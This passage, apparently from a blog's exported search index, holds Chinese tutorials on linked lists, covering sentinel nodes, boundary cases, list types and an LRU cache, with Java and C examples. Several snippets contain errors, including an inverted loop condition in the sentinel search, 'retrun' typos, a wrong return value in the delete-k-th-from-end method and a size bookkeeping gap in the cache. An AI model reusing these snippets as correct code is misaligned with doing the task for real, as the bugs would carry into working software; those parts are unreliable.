q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p-&gt;next = p-&gt;next-&gt;next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。 掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。 警惕指针丢失和内存泄露不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。 如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。 12p-&gt;next = c; // 将p的next指针指向c结点c-&gt;next = p-&gt;next; //将c结点next指针指向b结点 当p-&gt;next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c-&gt;next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。 对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。 利用哨兵简化实现难度首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。 12new_node-&gt;next = p-&gt;next; p-&gt;next = new_node; 但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。 1234if (head == null)&#123; head = new_node;&#125; 同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定： 1p-&gt;next = p-&gt;next-&gt;next； 但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下： 1234if (head-&gt;next == null)&#123; head = null;&#125; 可以看出，针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？ 这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。 还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。 如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做带头链表，相反，没有哨兵结点的链表叫做不带头链表。 如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。 实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。 代码一： 123456789101112131415161718// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度int find(char* a, int n, char key)&#123; // 边界条件处理，如果a为空，或者n&lt;=0 if(a == null || n&lt;=0)&#123; return -1; &#125; int i=0; // 这里有两个比较操作： i&lt;n 和 a[i] == key while(i&lt;n)&#123; if(a[i] == key)&#123; retrun i; &#125; ++i; &#125; retrun -1;&#125; 代码二： 12345678910111213141516171819202122232425262728293031323334// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度// 为了更好的解释，这里举了个例子来说明// a = &#123;4,2,3,5,9,6&#125; key = 7int find(char* a, int n, char key)&#123; // 边界条件处理，如果a为空，或者n&lt;=0 if(a == null || n&lt;=0)&#123; return -1; &#125; // 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值 if(a[n-1] == key)&#123; return n-1; &#125; // 临时变量保存a[n-1]，以便之后恢复，这里temp = 6 char temp = a[n-1]; // 把key值放到数组a[n-1]，此时a=&#123;4,2,3,5,9,7&#125; a[n-1] = key; int i=0; // 此时while循环比起代码一，少了i&lt;n这个比较操作 while(a[i] == key)&#123; ++i; &#125; // 将数组a[n-1] 恢复为原来的值 a[n-1] = temp; // 如果i = n-1，说明数组中没有要找的key if(i == n-1)&#123; return -1; &#125; // 否则，说明找到了key，位置为i else&#123; return i; &#125;&#125; 对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。 当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。 重点留意边界条件处理软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。 我经常用来检查链表代码是否正确执行的边界条件有这么几个： 如果链表为空时，代码是否能正常工作？ 如果一个链表只包含了一个结点，代码能否正常工作？ 如果链表只包含两个结点时，代码能否正常工作？ 代码逻辑在处理头结点和尾结点时，是否能正常工作？ 当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。 当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。 其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。 举列画图，辅助思考对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。 你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示： 看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。 多写多练，没有捷径如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。 下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。 单链表反转 链表中环的检测 两个有序链表合并 删除链表倒数第n个结点 求链表的中间结点 我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189/** * 链表的一些算法题目 */public class LinkListAlgorithm &#123; public static void main(String[] args) &#123; // 第一个链表，检测是否有环 System.out.println("链表中环的检测"); Node&lt;Integer&gt; n1 = new Node&lt;&gt;(1); Node&lt;Integer&gt; n2 = new Node&lt;&gt;(2); Node&lt;Integer&gt; n3 = new Node&lt;&gt;(3); n1.next = n2; n2.next = n3; n3.next = n1; // 1-&gt;2-&gt;3-&gt;1 System.out.println(isLoop(n1)); // true System.out.println("=========================================="); // 链表反转 System.out.println("链表反转"); Node&lt;Integer&gt; n4 = new Node&lt;&gt;(4); Node&lt;Integer&gt; n5 = new Node&lt;&gt;(5); Node&lt;Integer&gt; n6 = new Node&lt;&gt;(6); Node&lt;Integer&gt; n7 = new Node&lt;&gt;(7); n4.next = n5; n5.next = n6; n6.next = n7; System.out.println(printLinkList(n4)); // 4-&gt;5-&gt;6-&gt;7 Node&lt;Integer&gt; head = reverse(n4); System.out.println(printLinkList(head)); // 7-&gt;6-&gt;5-&gt;4 System.out.println("=========================================="); // 求链表的中间节点 System.out.println("求链表的中间节点"); Node&lt;Integer&gt; n8 = new Node&lt;&gt;(8); Node&lt;Integer&gt; n9 = new Node&lt;&gt;(9); Node&lt;Integer&gt; n10 = new Node&lt;&gt;(10); Node&lt;Integer&gt; n11 = new Node&lt;&gt;(11); Node&lt;Integer&gt; n12 = new Node&lt;&gt;(12); n8.next = n9; n9.next = n10; n10.next = n11; n11.next = n12; // 8-&gt;9-&gt;10-&gt;11-&gt;12 System.out.println(printLinkList(n8)); Node&lt;Integer&gt; mid = middle(n8); System.out.println("中间节点是： " + mid.val); // 10 System.out.println("=========================================="); // 有序链表合并 System.out.println("有序链表合并"); Node&lt;Integer&gt; n13 = new Node&lt;&gt;(13); Node&lt;Integer&gt; n14 = new Node&lt;&gt;(14); Node&lt;Integer&gt; n15 = new Node&lt;&gt;(15); n13.next = n14; n14.next = n15; System.out.println("第一个链表： "+printLinkList(n8)); System.out.println("第二个链表： "+printLinkList(n13)); head = merge(n8, n13); System.out.println("合并后的链表： "+printLinkList(head)); System.out.println("=========================================="); // 删除倒数第2个节点 Node&lt;Integer&gt; n16 = new Node&lt;&gt;(16); Node&lt;Integer&gt; n17 = new Node&lt;&gt;(17); Node&lt;Integer&gt; n18 = new Node&lt;&gt;(18); Node&lt;Integer&gt; n19 = new Node&lt;&gt;(19); n16.next = n17; n17.next = n18; n18.next = n19; System.out.println("删除前： "+printLinkList(n16)); head = deleteLastKDesc(n16, 3); System.out.println("删除后： "+printLinkList(n16)); &#125; /** 合并两个有序链表 */ private static Node&lt;Integer&gt; merge(Node&lt;Integer&gt; n1, Node&lt;Integer&gt; n2) &#123; // 确定新链表头结点 Node&lt;Integer&gt; head, p = n1, q = n2; if (p.val &gt; q.val)&#123; head = n2; q = q.next; &#125;else&#123; head = n1; p = p.next; &#125; Node&lt;Integer&gt; r = head; while (p!=null &amp;&amp;q!=null)&#123; if (p.val &lt; q.val)&#123; r.next = p; p = p.next; &#125;else &#123; r.next = q; q = q.next; &#125; r = r.next; &#125; if (p!=null)&#123; r.next = p; &#125;else&#123; r.next = q; &#125;; return head; &#125; /**查找链表中间节点*/ private static Node&lt;Integer&gt; middle(Node&lt;Integer&gt; head) &#123; if (head==null) return null; Node&lt;Integer&gt; p = head; Node&lt;Integer&gt; q = head; while (q.next !=null &amp;&amp; q.next.next!=null)&#123; q = q.next.next; p = p.next; &#125; return p; &#125; /** 链表中环的检测*/ private static boolean isLoop(Node&lt;Integer&gt; head)&#123; // 采用快慢指针法 如果两个指针相遇，则说明有环 Node&lt;Integer&gt; p = head; Node&lt;Integer&gt; q = head.next.next; while (q!=null)&#123; p = p.next; q = q.next.next; if (q == p)&#123; return true; &#125; &#125; return false; &#125; /**反转链表*/ private static Node&lt;Integer&gt; reverse(Node&lt;Integer&gt; head)&#123; if (head.next == null)return head; Node&lt;Integer&gt; p; Node&lt;Integer&gt; q; Node&lt;Integer&gt; r; p = head; q = p.next; p.next = null; while (q != null)&#123; r = q.next; q.next = p; p = q; q = r; &#125; return p; &#125; /**删除链表倒数第K个结点*/ private static Node&lt;Integer&gt; deleteLastKDesc(Node&lt;Integer&gt; head, int k)&#123; if (head == null || k &lt;0) return null; Node&lt;Integer&gt; p = head; while (p != null)&#123; p = p.next; k--; &#125; if (k == 0)&#123; return head.next; &#125; if (k &lt; 0)&#123; p = head; while (++k != 0)&#123; p = p.next; &#125; p.next = p.next.next; &#125; return p; &#125; private static class Node&lt;E&gt; &#123; E val; Node&lt;E&gt; next; Node(E e)&#123; this.val = e; &#125; &#125; private static String printLinkList(Node&lt;Integer&gt; head)&#123; StringBuilder sb = new StringBuilder(); sb.append("["); while (head !=null)&#123; if (head.next !=null) sb.append(head.val).append(", "); else sb.append(head.val); head = head.next; &#125; sb.append("]"); return sb.toString(); &#125;&#125; (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-链表]]></title>
    <url>%2Fposts%2F2018-09-12-%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8.html</url>
    <content type="text"><![CDATA[前言 今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。 缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。 缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。 今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？ 链表及其结构 相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。 我们先从底层存储结构来看一下二者的区别： 为了直观的对比，我画了一张图，从图中可以看到，数组需要一块连续的内存空间来存储，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。 而链表恰恰相反，它并不需要一块连续的内存空间，他通过“指针”将一组零散的内存块连接起来使用，所以申请一块大小是100MB的链表，根本不会有问题。 链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。 单链表首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“结点”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做后继指针 next。 从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为头结点，最后一个节点称为尾结点。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。 与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。 为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。 但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。 你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。 好了，单链表了解了，下面来看看另外两个复杂的链表：循环链表和双向链表。 循环链表循环链表是一种特殊的单链表。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。 和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。 双线链表接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：双向链表。 单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。 从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？ 从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。 你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。 我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况： 删除结点中“值等于某个给定值的”结点 删除给定指针指向的结点 对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。 尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。 对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p-&gt;next = q，说明p是q的前驱结点。 但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！ 同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。 除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。 现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。 实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。 还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。 所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？ 了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：双向循环链表。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？ 链表 VS 数组性能大比拼 通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。 时间复杂度 数组 链表 插入删除 O(n) O(1) 随机访问 O(1) O(n) 不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。 数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。 数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。 你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。 我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。 除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。 所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。 解答开篇 好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？ 我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。 如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。 如果此数据没有缓存在链表中，又可以分为两种情况： 如果此时缓存未满，则将此结点直接插入到链表的头部； 如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。 这样我们就实现了一个LRU缓存，是不是很简单。 现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。 实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。 基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？ 内容小结 今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。 和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。 课后思考 如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。 (adsbygoogle = window.adsbygoogle || []).push({}); 本章代码：GitHub 带头单链表代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211import java.util.NoSuchElementException;public class SinglyLinkedList&lt;T&gt;&#123; private Node&lt;T&gt; head; private int size; public SinglyLinkedList()&#123; this.head = new Node&lt;&gt;(null); &#125; // 链表头部插入值 private void linkFirst(Node&lt;T&gt; newNode)&#123; newNode.next = head.next; head.next = newNode; size++; &#125; // 链表尾部插入值 public void linkLast(T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); linkLast(newNode); &#125; private void linkLast(Node&lt;T&gt; newNode)&#123; Node&lt;T&gt; p = head; while (p.next!=null)&#123; p=p.next; &#125; p.next = newNode; size++; &#125; // 获取头部值 public T getFirst()&#123; if (head.next == null)&#123; throw new NoSuchElementException(); &#125; return head.next.val; &#125; // 获取尾部值 public T getLast()&#123; Node&lt;T&gt; p = head.next; while (p.next!=null)&#123; p = p.next; &#125; return p.val; &#125; // 添加 public void add(T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); linkLast(newNode); &#125; // 在某处索引插入 public void add(int index, T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); Node&lt;T&gt; p = node(index); insert(p, newNode); &#125; private void insert(Node&lt;T&gt; p, Node&lt;T&gt; newNode)&#123; Node&lt;T&gt; q = head; while (q!=null &amp;&amp; q.next!=p)&#123; q = q.next; &#125; if (q == null)&#123; return; &#125; newNode.next = p; q.next = newNode; &#125; // 根据值删除某个节点 public boolean delete(T val)&#123; Node&lt;T&gt; p = head; while (p.next !=null &amp;&amp; !p.next.val.equals(val))&#123; p = p.next; &#125; if (p.next== null)&#123; return false; &#125; p.next = p.next.next; return true; &#125; // 根据索引删除某结点 public T delete(int index)&#123; Node&lt;T&gt; deleteNode = node(index); return deleteNode(deleteNode); &#125; private T deleteNode(Node&lt;T&gt; deleteNode)&#123; final T element = deleteNode.val; Node&lt;T&gt; p = head; while (p.next!= null &amp;&amp; p.next != deleteNode)&#123; p = p.next; &#125; if (p.next == null)&#123; return null; &#125; p.next = deleteNode.next; return element; &#125; // 根据索引获取值 public T get(int index)&#123; if (index &gt;= size || index &lt; 0)&#123; throw new IndexOutOfBoundsException("Index: "+index + ", Size: "+size); &#125; return node(index).val; &#125; // 通过value 查找对应的索引 public int indexOf(T val)&#123; int index = 0; Node&lt;T&gt; p = head; while (p.next !=null &amp;&amp; p.next.val!=val)&#123; p = p.next; index ++; &#125; if (p.next == null)&#123; index = -1; &#125; return index; &#125; public boolean contains(T val)&#123; Node&lt;T&gt; p = head; while (p.next !=null &amp;&amp; p.next.val!=val)&#123; p = p.next; &#125; return p.next != null; &#125; private Node&lt;T&gt; node(int index)&#123; if (index &gt;= size || index &lt; 0)&#123; throw new IndexOutOfBoundsException("Index: "+index + ", Size: "+size); &#125; Node&lt;T&gt; p = head.next; int i=0; while (i&lt;size)&#123; if (i == index)&#123; break; &#125; p = p.next; ++i; &#125; return p; &#125; public void push(T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); linkFirst(newNode); &#125; public T pop()&#123; return unlinkedFirst(); &#125; private T unlinkedFirst()&#123; Node&lt;T&gt; first = head.next; if (first == null)&#123; throw new RuntimeException("没有元素"); &#125; return unlinkedFirst(first); &#125; private T unlinkedFirst(Node&lt;T&gt; node)&#123; final T element = node.val; head.next = head.next.next; node.next = null; node.val = null; size--; return element; &#125; // 单链表反转 public void reverse()&#123; // 链表为空或者链表只有一个元素时 if (head.next == null || size &lt;=1 )&#123; return; &#125; Node&lt;T&gt; p = head.next; Node&lt;T&gt; q = p.next; Node&lt;T&gt; r; p.next = null; while (q !=null)&#123; r = q.next; q.next = p; p = q; q = r; &#125; head.next = p; &#125; public int size()&#123; return size; &#125; // 打印链表 example: [1, 2, 3] @Override public String toString() &#123; if (head.next == null)&#123; return "[]"; &#125; StringBuilder sb = new StringBuilder(); sb.append("["); Node&lt;T&gt; p = head.next; while (p.next!=null)&#123; sb.append(p.val).append(", "); p = p.next; &#125; sb.append(p.val).append("]"); return sb.toString(); &#125; public static class Node&lt;T&gt;&#123; private T val; private Node&lt;T&gt; next; Node(T val)&#123; this.val = val; &#125; &#125;&#125; 基于链表的LRU缓存代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182public interface LRUCache&lt;T&gt; &#123; void put(T val); T get(T val); int Size();&#125;class ListLRUCache&lt;T&gt; implements LRUCache&lt;T&gt; &#123; private SinglyLinkedList&lt;T&gt; lruList; private static final int DEFAULT_CAP=10; // 缓存容量 private int cap; // 缓存使用大小 private int size; public ListLRUCache()&#123; this(DEFAULT_CAP); &#125; public ListLRUCache(int cap)&#123; this.cap = cap; this.lruList = new SinglyLinkedList&lt;&gt;(); &#125; @Override public void put(T value) &#123; // 1、缓存满了 // 如果该列表中没有该数据 if (size == cap)&#123; // 1、缓存满了 // 删除最后一个节点 lruList.delete(size-1); // 将该数据插入到链表头部 lruList.push(value); &#125;else &#123; // 2、缓存未满 // 直接在列表头部插入该数据 lruList.push(value); size++; &#125; &#125; @Override public T get(T val) &#123; T result = null; if (lruList.contains(val))&#123; // 在list中,从list中获取该数据 int index = lruList.indexOf(val); result = lruList.get(index); System.out.println("从缓存中获取"); // 将该节点插入到链表头部 lruList.delete(index); lruList.push(val); &#125;else&#123; // 如果该列表中没有该数据 System.out.println("缓存中没有该数据！"); if (size == cap)&#123; // 1、缓存满了 // 删除最后一个节点 lruList.delete(size-1); // 将该数据插入到链表头部 lruList.push(val); System.out.println("缓存已满！将该数据插入到缓存"); &#125;else &#123; // 2、缓存未满 // 直接在列表头部插入该数据 lruList.push(val); size++; System.out.println("将该数据直接插入到缓存"); &#125; // 如果有数据库，该数据从数据库中获取 result = val; &#125; return result; &#125; public int Size()&#123; return size; &#125;&#125; 字符串是否是回文字符串：12]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-数组]]></title>
    <url>%2Fposts%2F2018-09-10-%E7%AE%97%E6%B3%95-%E6%95%B0%E7%BB%84.html</url>
